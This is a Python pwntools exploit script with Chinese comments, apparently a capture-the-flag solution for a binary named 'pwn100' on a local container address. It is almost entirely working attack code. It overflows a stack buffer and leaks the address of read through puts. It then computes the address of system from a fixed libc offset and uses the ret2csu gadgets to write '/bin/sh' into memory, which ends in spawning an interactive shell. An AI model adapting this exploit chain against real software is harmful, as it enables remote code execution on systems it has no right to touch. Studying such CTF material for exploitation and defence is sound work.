#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("172.17.0.3", 10001)
elf = ELF("./pwn100")

puts_addr = elf.plt['puts']
read_got = elf.got['read']

start_addr = 0x400550
pop_rdi = 0x400763
universal_gadget1 = 0x40075a   	#万能gadget1：pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn
universal_gadget2 = 0x400740	#万能gadget2：mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
binsh_addr = 0x60107c			#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃

payload = "A"*72				#padding
payload += p64(pop_rdi)			#
payload += p64(read_got)
payload += p64(puts_addr)
payload += p64(start_addr)		#跳转到start，恢复栈
payload = payload.ljust(200, "B")	#padding

io.send(payload)
io.recvuntil('bye~\n')
read_addr = u64(io.recv()[:-1].ljust(8, '\x00'))
log.info("read_addr = %#x", read_addr)
system_addr = read_addr - 0xb31e0
log.info("system_addr = %#x", system_addr)

payload = "A"*72			#padding
payload += p64(universal_gadget1)	#万能gadget1
payload += p64(0)			#rbx = 0
payload += p64(1)			#rbp = 1，过掉后面万能gadget2的call返回后的判断
payload += p64(read_got)	#r12 = got表中read函数项，里面是read函数的真正地址，直接通过call调用
payload += p64(8)			#r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx
payload += p64(binsh_addr)	#r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi
payload += p64(0)			#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi
payload += p64(universal_gadget2)	#万能gadget2
payload += '\x00'*56		#万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈
payload += p64(start_addr)	#跳转到start，恢复栈
payload = payload.ljust(200, "B")	#padding

io.send(payload)
io.recvuntil('bye~\n')
io.send("/bin/sh\x00")		#上面的一段payload调用了read函数读取"/bin/sh\x00"，这里发送字符串

payload = "A"*72				#padding
payload += p64(pop_rdi)			#给system函数传参
payload += p64(binsh_addr)		#rdi = &("/bin/sh\x00")
payload += p64(system_addr)		#调用system函数执行system("/bin/sh")
payload = payload.ljust(200, "B")	#padding

io.send(payload)
io.interactive()